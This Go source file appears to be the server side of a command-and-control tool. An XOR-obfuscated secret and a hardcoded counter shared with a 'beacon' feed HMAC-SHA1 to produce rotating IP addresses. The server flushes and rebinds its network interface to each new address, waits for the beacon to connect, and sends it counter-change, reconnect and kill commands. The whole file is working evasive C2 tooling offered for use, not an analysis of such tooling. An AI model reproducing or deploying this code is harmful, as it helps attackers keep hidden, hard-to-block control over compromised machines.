package server

import (
	"bufio"
	"crypto/hmac"
	"crypto/sha1"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"time"
	"os/exec"
	"strings"
)

const (
	green   = "\033[32m"
	yellow  = "\033[33m"
	red     = "\033[31m"
	cyan    = "\033[36m"
	reset   = "\033[0m"
	clear   = "\033[H\033[2J"
)

// Clear screen
func clearScreen() {
	fmt.Print(clear)
}

// Print with color and format
func printPretty(msg string, color string) {
	fmt.Println(color, msg, reset)
}

// Secret parts
var a = []byte{111, 110, 98, 38, 37, 85, 65, 110}
var b = []byte{80, 50, 104, 56, 119, 47, 58, 70}
var c = []byte{33, 38, 102, 72, 75, 44, 105, 104}
var d = []byte{60, 67, 42, 99, 84, 99, 79, 77}
var e = []byte{36, 93, 100, 94, 87, 111, 112, 72}
var f = []byte{122, 88, 97, 116, 116, 82, 70, 76}
var g = []byte{122, 41, 97, 123, 39, 98, 73, 122}
var h = []byte{80, 57, 95, 46, 98, 63, 59}

// XOR key parts
var x = []byte("Xk12Pa")
var y = []byte("Ym7pLz")

// XOR encrypt/decrypt function
func xorEncryptDecrypt(input []byte, key []byte) []byte {
	output := make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		output[i] = input[i] ^ key[i%len(key)]
	}
	return output
}

// Construct the full secret dynamically
func GetSecret() []byte {
	secret := append(a, b...)
	secret = append(secret, c...)
	secret = append(secret, d...)
	secret = append(secret, e...)
	secret = append(secret, f...)
	secret = append(secret, g...)
	secret = append(secret, h...)

	return xorEncryptDecrypt(secret, append(x, y...))
}

// Generate the full IP address from secret and counter
func GenerateFullIP(secret []byte, counter uint64) string {
	counterBytes := make([]byte, 8)
	binary.BigEndian.PutUint64(counterBytes, counter)

	hash := hmac.New(sha1.New, secret)
	hash.Write(counterBytes)
	hmacResult := hash.Sum(nil)

	ipSegment1 := int(hmacResult[0]%254) + 1
	ipSegment2 := int(hmacResult[1]%254) + 1
	ipSegment3 := int(hmacResult[2]%254) + 1
	ipSegment4 := int(hmacResult[3]%254) + 1

	generatedIP := fmt.Sprintf("%d.%d.%d.%d", ipSegment1, ipSegment2, ipSegment3, ipSegment4)

	// Check if the IP is in the multicast range (224.0.0.0/4) and avoid it
	if ipSegment1 >= 224 && ipSegment1 <= 239 {
		printPretty("Generated IP falls in multicast range, regenerating...", yellow)
		return GenerateFullIP(secret, counter+1) // Increment the counter and try again
	}

	return generatedIP
}

// getSessionCounter can be fixed or synchronized with the beacon
func getSessionCounter() uint64 {
	// This should match the value used by the beacon
	return 42 // hardcoded counter that both server and beacon use
}

// changeCounter increments the counter
func changeCounter(currentCounter uint64) uint64 {
	return currentCounter + 1
}

// Print help menu with available commands
func printHelpMenu() {
	fmt.Println(green + "\nAvailable commands:" + reset)
	fmt.Println("1. " + green + "change_counter: " + reset + "Increments the counter used for IP generation.")
	fmt.Println("2. " + green + "apply_change: " + reset + "Applies the new IP and forces the beacon to reconnect.")
	fmt.Println("3. " + green + "kill: " + reset + "Terminates the beacon connection.")
}

// Wait for user input and return the typed command
func getUserInput() string {
	fmt.Print(cyan + "Enter command: " + reset)
	reader := bufio.NewReader(os.Stdin)
	command, _ := reader.ReadString('\n')
	return strings.TrimSpace(command)
}

func StartProxyServer() {
	clearScreen() // Clear screen at the start of the proxy

	// Use environment variables to set up interface and port for Docker/OpenVPN
	vpnInterface := os.Getenv("VPN_INTERFACE")
	if vpnInterface == "" {
		vpnInterface = "0.0.0.0" // This is the listen interface, but we want the actual IP
	}
	vpnPort := os.Getenv("VPN_PORT")
	if vpnPort == "" {
		vpnPort = ":8080"
	}

	interfaceName := "eth0" // Change to your actual interface name if needed

	// Initialize the counter and secret variables at the beginning
	counter := getSessionCounter() // Initialize the counter
	secret := GetSecret()          // Initialize the secret

	for {
		// Bind the IP address to the network interface
		newIP := GenerateFullIP(secret, counter) // Generate the IP from the secret and counter
		printPretty("Generated new IP: "+newIP, cyan)

		err := UpdateServerIP(interfaceName, newIP)
		if err != nil {
			printPretty("Error binding IP "+newIP+": "+err.Error(), red)
			return
		}

		// Wait for the IP to fully bind
		printPretty("Waiting 5 seconds to ensure the IP is fully bound before starting the listener...", yellow)
		time.Sleep(5 * time.Second)

		// Now, retrieve the bound IP
		boundIP, err := getNetworkIP(interfaceName)
		if err != nil {
			printPretty("Error retrieving IP for interface "+interfaceName+": "+err.Error(), red)
			boundIP = "unknown"
		}
		printPretty("Network IP for interface "+interfaceName+" after binding: "+boundIP, green)

		// Start listening on the newly bound IP address
		listenerAddress := boundIP + vpnPort
		ln, err := net.Listen("tcp", listenerAddress)
		if err != nil {
			panic(fmt.Sprintf("Failed to bind listener to %s: %v", listenerAddress, err))
		}
		defer ln.Close()

		printPretty("Proxy server listening on IP "+boundIP+" and port "+vpnPort, green)
		printPretty("\nWaiting for Beacon connection...", yellow)

		beaconConn, err := ln.Accept()
		if err != nil {
			printPretty("Error accepting Beacon connection: "+err.Error(), red)
			continue
		}
		printPretty("Beacon connected!", green)

		// Print the help menu
		printHelpMenu()

		for {
			// Get user input (command)
			command := getUserInput()

			switch command {
			case "change_counter":
				// Send the "change_counter" command to the beacon
				_, err = beaconConn.Write([]byte("change_counter\n"))
				if err != nil {
					printPretty("Error: Could not send change_counter to Beacon: "+err.Error(), red)
					beaconConn.Close()
					break
				}

				// Increment the counter for the next IP generation
				counter = changeCounter(counter)
				printPretty("Server Counter updated: "+fmt.Sprint(counter), cyan)

			case "apply_change":
				// Send the "apply_change" command to the beacon
				clearScreen()
				_, err = beaconConn.Write([]byte("apply_change\n"))
				if err != nil {
					printPretty("Error: Could not send apply_change to Beacon: "+err.Error(), red)
					beaconConn.Close()
					break
				}

				// Unbind the old IP and bind the new IP
				err = UpdateServerIP(interfaceName, GenerateFullIP(secret, counter))
				if err != nil {
					printPretty("Error: Failed to update server IP: "+err.Error(), red)
					beaconConn.Close()
					break
				}

				// Add a delay to ensure the IP binding is fully applied before restarting the listener
				printPretty("Waiting 5 seconds to ensure the IP is fully bound before restarting the listener...", yellow)
				time.Sleep(5 * time.Second)

				// Restart the listener on the new IP by restarting the loop
				printPretty("New IP Address: "+GenerateFullIP(secret, counter), green)
				printPretty("Restarting listener on the new IP...", cyan)
				ln.Close() // Close the old listener
				goto restartListener

			case "kill":
				// Send the "kill" command to the beacon
				_, err = beaconConn.Write([]byte("kill\n"))
				if err != nil {
					printPretty("Error: Could not send kill command to Beacon: "+err.Error(), red)
				}
				printPretty("Kill command sent. Closing connection.", yellow)
				beaconConn.Close()
				return

			default:
				printPretty("Unknown command. Please enter a valid command.", red)
				printHelpMenu() // Print the help menu again
			}
		}

	restartListener: // This label allows us to restart the listener when needed
		continue
	}
}

// UnbindCurrentIP unbinds the current public IP from the network interface.
func UnbindCurrentIP(interfaceName string) error {
	cmd := exec.Command("ip", "addr", "flush", "dev", interfaceName)
	err := cmd.Run()
	if err != nil {
		return fmt.Errorf("failed to unbind current IP: %v", err)
	}
	fmt.Println("Successfully unbound the current public IP address.")
	return nil
}

// BindNewIP binds the newly generated IP to the network interface.
func BindNewIP(newIP string, interfaceName string) error {
	cmd := exec.Command("ip", "addr", "add", fmt.Sprintf("%s/32", newIP), "dev", interfaceName)
	err := cmd.Run()
	if err != nil {
		return fmt.Errorf("failed to bind new IP: %v", err)
	}
	fmt.Printf("Successfully bound new IP address: %s\n", newIP)
	return nil
}

// UpdateServerIP dynamically updates the server's IP by first unbinding the current IP, then binding a new one.
func UpdateServerIP(interfaceName string, newIP string) error {
	// Unbind the current public IP
	err := UnbindCurrentIP(interfaceName)
	if err != nil {
		return fmt.Errorf("failed to unbind current IP: %v", err)
	}

	// Bind the new IP
	err = BindNewIP(newIP, interfaceName)
	if err != nil {
		return fmt.Errorf("failed to bind new IP: %v", err)
	}
	return nil
}

// Function to get the actual IP address of the network interface
func getNetworkIP(interfaceName string) (string, error) {
	iface, err := net.InterfaceByName(interfaceName)
	if err != nil {
		return "", fmt.Errorf("could not find interface %s: %v", interfaceName, err)
	}

	addrs, err := iface.Addrs()
	if err != nil {
		return "", fmt.Errorf("could not get addresses for interface %s: %v", interfaceName, err)
	}

	for _, addr := range addrs {
		// We're interested in IP addresses, not MAC addresses
		var ip net.IP
		switch v := addr.(type) {
		case *net.IPNet:
			ip = v.IP
		case *net.IPAddr:
			ip = v.IP
		}

		// Exclude loopback addresses (127.0.0.1)
		if ip != nil && !ip.IsLoopback() && ip.To4() != nil {
			return ip.String(), nil
		}
	}

	return "", fmt.Errorf("no valid IP address found for interface %s", interfaceName)
}
